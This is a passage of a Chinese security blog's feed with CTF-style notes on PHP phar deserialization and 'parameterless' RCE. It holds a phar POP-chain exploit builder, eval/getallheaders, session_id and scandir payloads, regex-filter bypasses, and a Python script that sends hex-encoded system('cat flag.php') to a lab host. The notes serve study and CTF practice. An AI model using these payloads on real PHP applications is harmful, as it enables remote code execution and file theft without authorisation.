Show()</code>即可触发</p><p>于是完整pop链如下：</p><p><code>C1e4r::__destruct -&gt; Show::__toSting -&gt; Test::__get</code></p><p>注意，这里<code>__get</code>方法中的<code>$key</code>的值为触发该方法时传入的不可访问属性的值，</p><p>简而言之就是如果<code>$this-&gt;str[&#39;str&#39;]-&gt;abc   =====&gt;   __get(abc)</code>，而题目中的是固定好的<code>socure</code>，</p><p>所以只需要<code>params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;</code>即可</p><p>exp如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为 phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置 stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的 meta-data 存入 manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"poc.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>随后改后缀为jpg再上传，然后找到该文件，利用文件包含读取即可get flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2958#toc-2&quot;&gt;Phar与Stream Wrapper造成PHP RCE的深入挖掘&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/205943.html&quot;&gt;PHAR反序列化拓展操作总结&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://paper.seebug.org/680/&quot;&gt;利用 phar 拓展 php 反序列化漏洞攻击面&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="反序列化" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP无参数RCE</title>
    <link href="https://www.extrader.top/posts/4f9c9406/"/>
    <id>https://www.extrader.top/posts/4f9c9406/</id>
    <published>2020-04-28T10:21:37.000Z</published>
    <updated>2020-08-09T04:24:49.958Z</updated>
    
    <content type="html"><![CDATA[<p>膜膜膜膜膜膜（这东西真的是奇淫技巧）</p><p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>限制条件</strong>：<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)</code></p><span id="more"></span><p><strong>目录下文件</strong>：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429110200063.png" alt loading="lazy"></p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a><strong>测试代码</strong></h4><pre class="language-php" data-language="php"><code class="language-php">//index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>(?R)</code>引用当前表达式，后面加了<code>?</code>递归调用</p><p>以上正则表达式只匹配<code>a(b(c()))</code>或<code>a()</code>这种格式，不匹配<code>a(&quot;123&quot;)</code>，也就是说我们传入的值函数不能带有参数</p><h4 id="Payload1-getenv"><a href="#Payload1-getenv" class="headerlink" title="Payload1-getenv()"></a>Payload1-getenv()</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可以获取敏感信息</p><ul><li><strong>getenv()</strong>：获取一个环境变量的值，<code>phpinfo()</code>可以获取所有环境变量</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429113257924.png" alt loading="lazy"></p><h4 id="Payload2-getallheaders"><a href="#Payload2-getallheaders" class="headerlink" title="Payload2-getallheaders()"></a><strong>Payload2</strong>-getallheaders()</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>RCE</p><ul><li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li><li><strong>getallheaders()</strong>：获取全部 HTTP 请求头信息</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429114144142.png" alt loading="lazy"></p><h4 id="Payload3-get-defined-vars"><a href="#Payload3-get-defined-vars" class="headerlink" title="Payload3-get_defined_vars()"></a>Payload3-get_defined_vars()</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>flag<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>利用全局变量进RCE</p><ul><li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，会返回<code>$_GET,$_POST,$_COOKIE,$_FILES</code>全局变量的值</li><li><strong>current()</strong>：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回<code>$_GET</code>变量的数组值</li><li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。返回数组顺序为<code>get-&gt;post-&gt;cookie-&gt;files</code></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429115651090.png" alt loading="lazy"></p><p>而如果网站对<code>$_GET,$_POST,$_COOKIE</code>都做的过滤， 那我们只能从<code>$_FILES</code>入手了，exp如下：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  txt <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>      txt <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token keyword">return</span> txtpayload <span class="token operator">=</span> str2hex<span class="token punctuation">(</span><span class="token string">"system('cat flag.php');"</span><span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    payload<span class="token punctuation">:</span> <span class="token string">b'extrader'</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://192.168.0.107/index.php?exp=eval(hex2bin(array_rand(end(get_defined_vars()))));"</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>  <span class="token comment"># allow_redirects=False 禁用重定向处理</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ul><li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个，<code>array_rand()</code>返回随机单元的键名。 否则就返回包含随机键名的数组。</li><li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li><li><strong>hex2bin()</strong>：转换十六进制字符串为二进制字符串</li></ul><p>结果将输出<code>flag.php</code>文件的全部内容，由于空格和点都会被替换成下换线，所以需要用十六进制进行绕过</p><h4 id="Payload4-session-start"><a href="#Payload4-session-start" class="headerlink" title="Payload4-session_start()"></a>Payload4-session_start()</h4><p>文件读取：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>抓包传入Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span><span class="token punctuation">(</span>想读的文件<span class="token punctuation">)</span>即可</code></pre><p>RCE：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>抓包传入Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('命令')"</span>的十六进制<span class="token punctuation">)</span></code></pre><p>以上的payload好像只适用于<code>php7</code>以下的版本，php7以上的不会显示</p><ul><li><strong>session_start()</strong>：启动新会话或者重用现有会话，成功开始会话返回 <strong><code>TRUE</code></strong> ，反之返回 <strong><code>FALSE</code></strong></li><li><strong>session_id()</strong>：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。</li></ul><h4 id="Payload5-scandir"><a href="#Payload5-scandir" class="headerlink" title="Payload5-scandir()"></a>Payload5-scandir()</h4><p>文件读取：</p><pre class="language-php" data-language="php"><code class="language-php">当前目录：<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>上级目录文件：<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li><strong>getcwd()</strong>：取得当前工作目录，成功则返回当前工作目录，失败返回 <strong><code>FALSE</code></strong>。</li><li><strong>dirname()</strong>：返回路径中的目录部分，返回 path 的父目录。 如果在 <code>path</code> 中没有斜线，则返回一个点（’<em>.</em>‘），表示当前目录。否则返回的是把 <code>path</code> 中结尾的 <code>/component</code>（最后一个斜线以及后面部分）去掉之后的字符串(也就是上级目录的文件路径)。</li><li><strong>chdir()</strong>：改变目录，成功时返回 <strong><code>TRUE</code></strong>， 或者在失败时返回 <strong><code>FALSE</code></strong>。</li><li><strong>scandir()</strong>：列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 <strong><code>FALSE</code></strong>。如果 <code>directory</code> 不是个目录，则返回布尔值 <strong><code>FALSE</code></strong> 并生成一条 <strong><code>E_WARNING</code></strong> 级的错误。</li><li><strong>array_flip()</strong>：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 <strong><code>NULL</code></strong>。</li><li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，<strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。</li></ul><p><strong>array_flip()</strong>和<strong>array_rand()</strong>配合使用可随机返回当前目录下的文件名</p><p><strong>dirname(chdir(dirname()))</strong>配合切换文件路径</p><h4 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a><code>.</code>绕过</h4><h5 id="current-localeconv"><a href="#current-localeconv" class="headerlink" title="current(localeconv())"></a><strong>current(localeconv())</strong></h5><ul><li><strong>localeconv()</strong>：返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></li></ul><h5 id="phpversion"><a href="#phpversion" class="headerlink" title="phpversion()"></a><strong>phpversion()</strong></h5><ul><li><code>phpversion()</code>返回php版本，如<code>7.3.5</code></li><li><code>floor(phpversion())</code>返回<code>7</code></li><li><code>sqrt(floor(phpversion()))</code>返回<code>2.6457513110646</code></li><li><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></li><li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></li><li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></li><li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></li><li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>.</code></li><li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li><li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回<code>..</code></li></ul><p><strong>floor()</strong>：舍去法取整，<strong>sqrt()</strong>：平方根，<strong>tan()</strong>：正切值，<strong>cosh()</strong>：双曲余弦，<strong>sinh()</strong>：双曲正弦，<strong>ceil()</strong>：进一法取整</p><h5 id="crypt"><a href="#crypt" class="headerlink" title="crypt()"></a><strong>crypt()</strong></h5><p><code>chr(ord(hebrevc(crypt(phpversion()))))</code>返回<code>.</code></p><ul><li><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</li></ul><p><strong>crypt()</strong>：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。</p><p><strong>hebrevc()</strong>：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p><strong>current()</strong>的别名<strong>pos()</strong></p><p><strong>readgzfile</strong>可以代替<strong>readfile</strong></p><p>目录操作：</p><ul><li><strong>getchwd()</strong> ：函数返回当前工作目录。</li><li><strong>scandir()</strong> ：函数返回指定目录中的文件和目录的数组。</li><li><strong>dirname()</strong> ：函数返回路径中的目录部分。</li><li><strong>chdir()</strong> ：函数改变当前的目录。</li></ul><p>数组相关的操作：</p><ul><li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> ： 将内部指针指向数组中的最后一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> ：将内部指针指向数组中的下一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> ：将内部指针指向数组中的上一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> ： 将内部指针指向数组中的第一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> ： 返回当前元素的键名和键值，并将内部指针向前移动</li></ul><h4 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h4><h5 id="GXYCTF2019—禁止套娃"><a href="#GXYCTF2019—禁止套娃" class="headerlink" title="GXYCTF2019—禁止套娃"></a>GXYCTF2019—禁止套娃</h5><p>扫描目录<code>.git</code>源码泄露，<code>Githack</code>得到<code>index</code>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token delimiter important">?></span></span></code></pre><p>payload1：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>payload2：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span>flag<span class="token operator">.</span>php</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></li><li><a href="http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html">http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html</a></li><li><a href="https://www.gem-love.com/ctf/530.html?replytocom=5">https://www.gem-love.com/ctf/530.html?replytocom=5</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;膜膜膜膜膜膜（这东西真的是奇淫技巧）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件&lt;/strong&gt;：&lt;code&gt;eval($_GET[&amp;#39;exp&amp;#39;]);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;限制条件&lt;/strong&gt;：&lt;code&gt;preg_replace(&amp;#39;/[^\W]+\((?R)?\)/&amp;#39;, &amp;#39;&amp;#39;, $exp)&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
</feed>
